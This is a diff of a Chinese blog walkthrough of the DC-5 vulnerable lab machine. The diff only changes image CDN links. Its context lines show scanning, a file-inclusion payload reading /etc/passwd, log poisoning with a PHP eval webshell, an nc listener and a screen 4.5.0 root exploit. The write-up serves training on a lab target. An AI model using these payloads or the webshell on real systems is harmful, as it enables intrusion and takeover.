@@ -34,13 +34,13 @@ date: 2026-03-14 12:00:00
 ifconfig
 ```
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-5_image1.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image1.png)
 
 ```bash
 nmap -sn 192.168.168.0/24
 ```
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-5_image2.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image2.png)
 
 还可以用 `arp-scan` 扫描，两者对比如下：
 
@@ -56,7 +56,7 @@ arp-scan -l
 | 能否绕过防火墙 | ARP无法被过滤 | ICMP可能被屏蔽 |
 | 获取信息 | IP+MAC+制造商 | IP+端口+系统 |
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-5_image3.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image3.png)
 
 **扫描结果**
 
@@ -72,7 +72,7 @@ arp-scan -l
 nmap -A -p- 192.168.168.169
 ```
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-5_image4.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image4.png)
 
 - **80** → nginx 1.6.2（主要攻击面）
 - **111** → rpcbind
@@ -82,11 +82,11 @@ nmap -A -p- 192.168.168.169
 
 插件识别：
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-5_image5.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image5.png)
 
 只有 Contact 页面有点功能：
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-5_image6.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image6.png)
 
 ---
 
@@ -100,9 +100,9 @@ nmap -A -p- 192.168.168.169
 http://192.168.168.169//thankyou.php?firstname=1&lastname=1&country=canada&subject=1
 ```
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-5_image7.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image7.png)
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-5_image8.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image8.png)
 
 > 一直刷新发现下面的年份会改变
 
@@ -114,7 +114,7 @@ dirsearch -u http://192.168.168.169/
 apt-get install dirsearch
 ```
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-5_image9.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image9.png)
 
 发现 `/footer.php`，这个页面刷新年份也会变：
 
@@ -122,11 +122,11 @@ apt-get install dirsearch
 http://192.168.168.169/footer.php
 ```
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-5_image10.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image10.png)
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-5_image11.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image11.png)
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-5_image12.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image12.png)
 
 > **猜测：** thankyou.php 包含了 footer.php 文件，存在文件包含漏洞。
 
@@ -138,7 +138,7 @@ http://192.168.168.169/footer.php
 &filename=../../../../../etc/passwd
 ```
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-5_image13.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image13.png)
 
 成功读取！
 
@@ -181,9 +181,9 @@ include($_GET['file'] . ".php");
 
 关于为什么判断是 Linux 系统读取 `/etc/passwd`，最常用的判断方法就是 Linux 对大小写敏感，Windows 不敏感：
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-5_image14.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image14.png)
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-5_image15.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image15.png)
 
 ---
 
@@ -197,11 +197,11 @@ fuzzDicts-master\paramDict\php.txt
 
 很容易就爆破出来了：
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-5_image16.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image16.png)
 
 参数是 `file`：
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-5_image17.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image17.png)
 
 查看源代码看得更清楚。
 
@@ -211,7 +211,7 @@ fuzzDicts-master\paramDict\php.txt
 wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt http://192.168.168.169/thankyou.php?FUZZ=/etc/passwd
 ```
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-5_image18.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image18.png)
 
 ---
 
@@ -227,7 +227,7 @@ wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt http://192.168.168.169/tha
 
 直接提交会被编码，改用 Burp Suite 提交：
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-5_image19.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image19.png)
 
 在 User-Agent 或请求中传入 PHP 代码：
 
@@ -237,7 +237,7 @@ wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt http://192.168.168.169/tha
 
 然后再通过文件包含访问 `/var/log/nginx/access.log`，可以看到成功执行了：
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-5_image20.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image20.png)
 
 改成 Webshell，用蚁剑连接：
 
@@ -245,15 +245,15 @@ wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt http://192.168.168.169/tha
 <?php eval($_POST['a']); ?>
 ```
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-5_image21.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image21.png)
 
 > 备注：环境崩了一次，重装了，IP 变成了 170。
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-5_image22.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image22.png)
 
 查看 `/etc/passwd`：
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-5_image23.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image23.png)
 
 ---
 
@@ -272,7 +272,7 @@ Kali 监听：
 nc -lvnp 5566
 ```
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-5_image24.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image24.png)
 
 升级为交互式终端：
 
@@ -280,11 +280,11 @@ nc -lvnp 5566
 python -c 'import pty;pty.spawn("/bin/bash")'
 ```
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-5_image25.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image25.png)
 
 也没找到特别的用户：
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-5_image26.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image26.png)
 
 ---
 
@@ -296,7 +296,7 @@ python -c 'import pty;pty.spawn("/bin/bash")'
 find / -perm -4000 2>/dev/null
 ```
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-5_image27.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image27.png)
 
 找到一个可疑的 **screen 4.5.0**！
 
@@ -306,7 +306,7 @@ find / -perm -4000 2>/dev/null
 searchsploit screen 4.5.0
 ```
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-5_image28.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image28.png)
 
 选第一个，找到文件地址：
 
@@ -314,7 +314,7 @@ searchsploit screen 4.5.0
 find / -name 41154.sh
 ```
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-5_image29.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image29.png)
 
 ```
 /usr/share/exploitdb/exploits/linux/local/41154.sh
@@ -340,11 +340,11 @@ chmod 777 41154.sh
 bash 41154.sh
 ```
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-5_image30.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image30.png)
 
 找到 flag：
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-5_image31.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image31.png)
 
 ---
 
